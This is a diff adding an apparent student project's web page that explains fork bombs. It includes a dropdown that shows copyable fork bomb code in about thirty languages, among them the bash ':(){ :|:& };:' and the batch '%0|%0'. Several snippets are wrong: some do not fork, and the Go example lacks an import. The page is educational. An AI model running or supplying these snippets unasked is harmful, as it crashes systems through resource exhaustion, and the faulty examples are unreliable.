@@ -1,0 +1,400 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="garden">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>FBDS - Information</title>
+    <link
+      href="{{ url_for('static', filename='css/output.css') }}"
+      rel="stylesheet"
+    />
+    <link
+      href="{{ url_for('static', filename='css/animation.css') }}"
+      rel="stylesheet"
+    />
+    <link
+      href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/themes/prism-tomorrow.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>
+  </head>
+  <body class="font-jetbrains">
+
+    <div class="navbar bg-base-100">
+      <div class="flex-1">
+        <a href="/" class="btn btn-ghost normal-case text-xl">FBDS</a>
+      </div>
+      <div class="flex-none gap-2">
+        <div class="form-control">
+          <input
+            type="text"
+            placeholder="Search"
+            class="input input-bordered w-24 md:w-auto"
+            id="searchInput"
+            onkeyup="searchContent()"
+          />
+        </div>
+        <a href="/solution" class="btn btn-outline btn-secondary">Solution</a>
+      </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-8">
+      <div class="text-center mb-12">
+        <h1 class="text-4xl font-bold mb-6">What is a Fork Bomb?</h1>
+        <p class="text-xl mb-8">
+          A fork bomb is like a digital rabbit that keeps multiplying until your
+          computer runs out of resources!
+        </p>
+      </div>
+
+      <div class="grid grid-cols-1 md:grid-cols-3 gap-8 mb-12">
+        <div class="card bg-base-100 shadow-xl">
+          <div class="card-body">
+            <h2 class="card-title justify-center">Step 1: Creation</h2>
+            <p>
+              A fork bomb starts as a simple program that creates a copy of
+              itself.
+            </p>
+          </div>
+        </div>
+        <div class="card bg-base-100 shadow-xl">
+          <div class="card-body">
+            <h2 class="card-title justify-center">Step 2: Multiplication</h2>
+            <p>Each copy creates more copies, growing exponentially.</p>
+          </div>
+        </div>
+        <div class="card bg-base-100 shadow-xl">
+          <div class="card-body">
+            <h2 class="card-title justify-center">Step 3: System Impact</h2>
+            <p>
+              Your computer slows down as it runs out of memory and processing
+              power.
+            </p>
+          </div>
+        </div>
+      </div>
+
+      <div class="card bg-base-100 shadow-xl mb-12">
+        <div class="card-body">
+          <h2 class="card-title justify-center mb-8">Visual Example</h2>
+          <div class="flex flex-col items-center gap-8">
+            <div
+              class="w-24 h-24 bg-[#FF1493] rounded-lg flex items-center justify-center text-white font-bold"
+            >
+              Process
+            </div>
+
+            <div class="flex gap-32 relative">
+              <div
+                class="w-40 h-16 border-l-2 border-b-2 border-[#8B4766] rotate-[-135deg] absolute left-12 -top-8"
+              ></div>
+              <div
+                class="w-40 h-16 border-r-2 border-b-2 border-[#8B4766] rotate-[135deg] absolute right-12 -top-8"
+              ></div>
+            </div>
+
+            <div class="flex gap-32">
+              <div
+                class="w-20 h-20 bg-[#8B4766] rounded-lg flex items-center justify-center text-white font-bold"
+              >
+                Copy 1
+              </div>
+              <div
+                class="w-20 h-20 bg-[#8B4766] rounded-lg flex items-center justify-center text-white font-bold"
+              >
+                Copy 2
+              </div>
+            </div>
+          </div>
+        </div>
+        <p class="text-center text-xl">
+          And this goes on forever until there is some memory left.....
+        </p>
+      </div>
+    </div>
+
+
+    <script>
+      function searchContent() {
+        const searchInput = document.getElementById("searchInput");
+        const searchText = searchInput.value.toLowerCase();
+        const cards = document.querySelectorAll(".card");
+
+        cards.forEach((card) => {
+          const cardText = card.textContent.toLowerCase();
+          if (cardText.includes(searchText)) {
+            card.style.display = "";
+          } else {
+            card.style.display = "none";
+          }
+        });
+      }
+    </script>
+    <div class="card bg-base-100 shadow-xl mb-12">
+      <div class="card-body">
+        <h2 class="card-title justify-center mb-8">Fork Bomb Code Examples</h2>
+
+        <div class="flex flex-col md:flex-row gap-4">
+          <div class="w-full md:w-1/4">
+            <select
+              id="languageSelect"
+              class="select select-bordered w-full"
+              onchange="updateCode()"
+            >
+              <option value="" disabled selected>Select Language</option>
+              <option value="ada">Ada</option>
+              <option value="assembly">Assembly</option>
+              <option value="awk">AWK</option>
+              <option value="bash">Bash</option>
+              <option value="batch">Batch</option>
+              <option value="brainfuck">Brainfuck</option>
+              <option value="c">C</option>
+              <option value="cpp">C++</option>
+              <option value="csharp">C#</option>
+              <option value="csharpcore">C# (.Net Core)</option>
+              <option value="erlang">Erlang</option>
+              <option value="fasm">FASM</option>
+              <option value="go">Go</option>
+              <option value="haskell">Haskell</option>
+              <option value="java">Java</option>
+              <option value="javascript">JavaScript</option>
+              <option value="lisp">Lisp</option>
+              <option value="lua">Lua</option>
+              <option value="access">Microsoft Access</option>
+              <option value="nim">Nim</option>
+              <option value="php">PHP</option>
+              <option value="perl">Perl</option>
+              <option value="powershell">PowerShell</option>
+              <option value="python">Python</option>
+              <option value="r">R</option>
+              <option value="ruby">Ruby</option>
+              <option value="rust">Rust</option>
+              <option value="scheme">Scheme</option>
+              <option value="shell">Shell</option>
+              <option value="vb">Visual Basic</option>
+            </select>
+          </div>
+
+          <div class="w-full md:w-3/4">
+            <div class="relative">
+              <pre
+                class="bg-gray-900 text-white p-4 rounded-lg"
+              ><code id="codeBlock" class="language-plaintext"></code></pre>
+              <button
+                onclick="copyCode()"
+                class="btn btn-sm btn-circle absolute top-2 right-2"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="h-4 w-4"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    stroke-width="2"
+                    d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
+                  />
+                </svg>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      const codeExamples = {
+        ada: `with Ada.Text_IO;
+    procedure Bomb is
+      procedure Recursion is
+      begin
+        Recursion;
+      end Recursion;
+    begin
+      Recursion;
+    end Bomb;`,
+
+        assembly: `section .text
+    global _start
+    _start:
+        mov eax, 2
+        int 0x80
+        jmp _start`,
+
+        awk: `BEGIN { while(1) system("awk " ARGV[0]); }`,
+
+        bash: `:(){ :|:& };:`,
+
+        batch: `%0|%0`,
+
+        brainfuck: `+[>+]`,
+
+        c: `#include <unistd.h>
+    int main(void) {
+        while(1) fork();
+        return 0;
+    }`,
+
+        cpp: `#include <unistd.h>
+    int main(void) {
+        while(1) fork();
+        return 0;
+    }`,
+
+        csharp: `using System;
+    using System.Diagnostics;
+    class Program {
+        static void Main() {
+            while(true)
+                Process.Start(Process.GetCurrentProcess().MainModule.FileName);
+        }
+    }`,
+
+        csharpcore: `using System;
+    using System.Diagnostics;
+    class Program {
+        static void Main() {
+            while(true)
+                Process.Start("dotnet", Process.GetCurrentProcess().MainModule.FileName);
+        }
+    }`,
+
+        erlang: `bomb() -> bomb(), bomb().
+    bomb().`,
+
+        fasm: `format ELF executable
+    entry start
+    start:
+        mov eax,2
+        int 0x80
+        jmp start`,
+
+        go: `package main
+    import "os/exec"
+    func main() {
+        for {
+            exec.Command(os.Args[0]).Start()
+        }
+    }`,
+
+        haskell: `main = main >> main`,
+
+        java: `public class ForkBomb {
+        public static void main(String[] args) throws Exception {
+            while(true) {
+                Runtime.getRuntime().exec(new String[]{"java", "ForkBomb"});
+            }
+        }
+    }`,
+
+        javascript: `while(1) require('child_process').spawn(process.argv[1], process.argv.slice(1));`,
+
+        lisp: `(lambda () (fork) (fork))`,
+
+        lua: `while true do
+        os.execute("lua " .. arg[0])
+    end`,
+
+        access: `Function ForkBomb()
+        Shell "start " & Application.CurrentProject.FullName
+        ForkBomb
+    End Function`,
+
+        nim: `import os
+    while true:
+      discard execShellCmd("nim c -r " & paramStr(0))`,
+
+        php: `<?php while(1) { @pcntl_fork(); } ?>`,
+
+        perl: `fork while fork`,
+
+        powershell: `while($true) {Start-Process powershell.exe}`,
+
+        python: `import os
+    while True:
+        os.fork()`,
+
+        r: `while(TRUE) {
+        system("Rscript fork.r &")
+    }`,
+
+        ruby: `loop { fork }`,
+
+        rust: `use std::process::Command;
+    fn main() {
+        loop {
+            Command::new(std::env::current_exe().unwrap()).spawn().unwrap();
+        }
+    }`,
+
+        scheme: `(define f (lambda () (f) (f))) (f)`,
+
+        shell: `:(){ :|:& };:`,
+
+        vb: `Do
+        Shell("start " & App.Path & "\" & App.EXEName)
+    Loop`,
+      };
+
+      function updateCode() {
+        const language = document.getElementById("languageSelect").value;
+        const codeBlock = document.getElementById("codeBlock");
+        codeBlock.textContent =
+          codeExamples[language] || "Select a language to view the code";
+        Prism.highlightElement(codeBlock);
+      }
+
+      function copyCode() {
+        const codeBlock = document.getElementById("codeBlock");
+        navigator.clipboard.writeText(codeBlock.textContent);
+
+        const btn = event.currentTarget;
+        const originalHTML = btn.innerHTML;
+        btn.innerHTML = "✓";
+        setTimeout(() => {
+          btn.innerHTML = originalHTML;
+        }, 1000);
+      }
+    </script>
+    <footer class="bg-black text-white p-8 mt-auto">
+      <div class="container mx-auto">
+        <h2 class="text-2xl font-bold mb-4 text-center">About Us</h2>
+        <div class="overflow-x-auto">
+          <table class="table w-full max-w-2xl mx-auto">
+            <thead>
+              <tr class="text-white">
+                <th>USN</th>
+                <th>Name</th>
+              </tr>
+            </thead>
+            <tbody>
+              <tr class="text-white">
+                <td>1RVU23CSE072</td>
+                <td>Apoorv Gadiya</td>
+              </tr>
+              <tr class="text-white">
+                <td>1RVU23CSE160</td>
+                <td>G Lakshmi Anugnya</td>
+              </tr>
+              <tr class="text-white">
+                <td>1RVU23CSE244</td>
+                <td>Maanya Praveen</td>
+              </tr>
+              <tr class="text-white">
+                <td>1RVU23CSE413</td>
+                <td>Satyam Goyal</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+    </footer>
+  </body>
+</html>
